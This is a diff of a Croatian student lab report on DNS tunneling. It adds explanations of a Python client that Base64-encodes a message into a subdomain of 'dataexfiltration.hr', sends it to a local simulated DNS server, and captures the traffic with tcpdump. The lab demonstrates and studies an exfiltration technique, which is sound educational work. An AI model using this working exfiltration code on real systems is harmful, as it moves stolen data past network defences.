@@ -158,14 +158,40 @@ Ovo omogućuje da se DNS poslužitelj pokrene samo kada se skripta izvršava izr
 
 ## 2.3.2. Klijent - client.py
 
+Klijentska skripta implementirana u Pythonu zadužena je za generiranje DNS upita koji sadrže skrivenu (tuneliranu) poruku te njihovo slanje prema simuliranom DNS poslužitelju. Skripta koristi biblioteku dnspython, koja omogućuje jednostavno kreiranje i slanje DNS upita, dok se za skrivanje podataka koristi Base64 kodiranje. Ovakav pristup vjerno simulira tipičnu tehniku eksfiltracije podataka putem DNS protokola.
+
+Na početku skripte nalaze se uvozi potrebnih modula:
+```
 import dns.message
 import dns.query
 import base64
+```
+Modul dns.message omogućuje stvaranje DNS upita, dns.query upravlja slanjem upita putem UDP protokola, a base64 se koristi za kodiranje tajnih podataka u oblik pogodan za umetanje u ime domene.
 
+Kodiranje podataka u poddomenu
+
+Funkcija encode_data_in_subdomain(data, domain) pretvara proizvoljnu poruku u Base64 format i umetne je kao poddomenu ispred napadačeve domene:
+```
 def encode_data_in_subdomain(data, domain):
     encoded = base64.urlsafe_b64encode(data.encode()).decode()
     return f"{encoded}.{domain}"
+```
 
+Postupak je sljedeći:
+
+Poruka (data) se pretvara u bajtove i kodira Base64 algoritmom.
+
+Dobiveni Base64 niz se spaja s domenom napadača, pri čemu se formira DNS ime oblika:
+
+kodiranaPoruka.dataexfiltration.hr
+
+
+Ovaj pristup omogućuje skrivanje tajnih podataka unutar DNS upita jer svaki segment domene smije sadržavati alfanumeričke znakove i određene simbole — što Base64 ispunjava.
+
+Slanje tunelirane poruke DNS upitom
+
+Glavna funkcija transmit_dns_tunnel_message zadužena je za sastavljanje DNS upita, enkapsulaciju poruke te slanje upita prema ciljnom DNS poslužitelju:
+```
 def transmit_dns_tunnel_message(server, domain, message, port=53):
     query_domain = encode_data_in_subdomain(message, domain)
     query = dns.message.make_query(query_domain, dns.rdatatype.A)
@@ -175,7 +201,26 @@ def transmit_dns_tunnel_message(server, domain, message, port=53):
         print(f"Response:\n{response}")
     except Exception as e:
         print(f"Transmission failed: {e}")
+```
 
+Ova funkcija radi nekoliko ključnih koraka:
+
+Skrivanje poruke – poziva se encode_data_in_subdomain, koja poruku pretvara u Base64 i smješta je u ime domene.
+
+Stvaranje DNS upita – pomoću dns.message.make_query kreira se standardni DNS A upit za domenu koja u sebi nosi skrivenu poruku.
+
+Slanje upita UDP-om – dns.query.udp šalje DNS upit na adresu simuliranog poslužitelja.
+
+Ispis rezultata – skripta prikazuje izvorni tekst poruke, njezinu kodiranu verziju te DNS odgovor primljen sa servera.
+
+U slučaju problema (npr. nedostupan server), funkcija hvata iznimku i ispisuje poruku o grešci.
+
+Ovaj mehanizam vjerno predstavlja klijentsku stranu DNS tunnelinga — napadač šalje kriptirane podatke unutar DNS upita, a poslužitelj ih dekodira.
+
+Glavni dio skripte
+
+U glavnom dijelu definiraju se parametri tuneliranja i pokreće se funkcija za slanje poruke:
+```
 if __name__ == "__main__":
     domain = "dataexfiltration.hr"
     server_ip = "127.0.0.1"
@@ -184,16 +229,28 @@ if __name__ == "__main__":
     msg = "Ova poruka je tajna."
 
     transmit_dns_tunnel_message(server_ip, domain, msg, port=server_port)
+```
+
+domain predstavlja kontroliranu domenu napadača.
+
+server_ip i server_port upućuju na lokalni simulirani DNS poslužitelj implementiran ranije.
+
+msg sadrži podatke koje napadač želi eksfiltrirati.
+
+Poziv transmit_dns_tunnel_message inicira stvarni DNS tunneling.
+
+Ovaj dio skripte služi kao demonstracija kako se jednostavan tekst može “zapakirati“ u DNS upit i poslati, što u praksi predstavlja osnovni mehanizam DNS eksfiltracije podataka.
 
 ## 2.4. Slanje poruke i snimanje prometa
 
 ### 2.4.1. tcmdump
 
 Snimio sam pakete koji idu na portu 5354.
-
+```
 sudo tcpdump -i lo udp port 5354 -w dns_tunnel.pcap
+```
+<img width="674" height="53" alt="image" src="https://github.com/user-attachments/assets/68adec33-df9d-417a-9c34-c6cd96bd68a8" />
 
-Objasnjenje
 
 ### 2.4.2. Pokretanje DNS servera
 
@@ -205,6 +262,8 @@ python3 dns_server.py
 I dobio poruku:
 
 Starting DNS server on 0.0.0.0:5354
+
+<img width="830" height="84" alt="image" src="https://github.com/user-attachments/assets/63987700-56cc-457f-83bd-92c276547971" />
 
 ### 2.4.3. Pokretanje klijenta i slanje poruke
 
@@ -230,6 +289,8 @@ T3ZhIHBvcnVrYSBqZSB0YWpuYS4=.dataexfiltration.hr. 300 IN A 127.0.0.1
 ;AUTHORITY
 ;ADDITIONAL
 
+<img width="729" height="238" alt="image" src="https://github.com/user-attachments/assets/1e803ab6-0953-43a0-8d24-d0fcdf73e0a1" />
+
 ### 2.4.3. Čitanje tajne poruke
 
 donat@donat-VirtualBox:~/dns_tunnel$ python3 dns_server.py
@@ -237,6 +298,8 @@ DNS server is running on 0.0.0.0:5354
 Received DNS request for: T3ZhIHBvcnVrYSBqZSB0YWpuYS4=.dataexfiltration.hr. from ('127.0.0.1', 41631)
 Decoded secret: Ova poruka je tajna.
 Responding with IP: 127.0.0.1
+
+<img width="819" height="90" alt="image" src="https://github.com/user-attachments/assets/a6b2dc61-b38e-4c94-aeb6-af558db5e994" />
 
 ### 2.4.4. Zaustavljanje tcpdump-a
 
@@ -246,6 +309,8 @@ Kada sam zaustavio tcpdump dobio sam
 4 packets received by filter
 0 packets dropped by kernel
 donat@donat-VirtualBox:~$ ^C
+
+<img width="232" height="67" alt="image" src="https://github.com/user-attachments/assets/ffc478b0-9204-4ccb-a292-85e283a33e76" />
 
 Te sam dobio datoteku dns_tunnel.pcap.
 
